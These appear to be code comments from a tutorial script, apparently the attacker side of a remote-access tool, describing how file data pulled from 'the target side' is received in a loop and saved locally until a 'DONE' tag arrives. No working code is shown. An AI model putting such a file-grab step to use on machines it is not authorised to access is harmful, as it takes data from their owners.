# received bytes , then we go into infinite loop and store the received data into our file holder "test.png", however
# If the requested file doesn't exist or if we reached the end of the file then we will break the loop
# note that we could know the end of the file, if we received the "DONE" tag from the target side

# Keep in mind that you can enhance the code and dynamically change the test.png to other file extension based on the user input
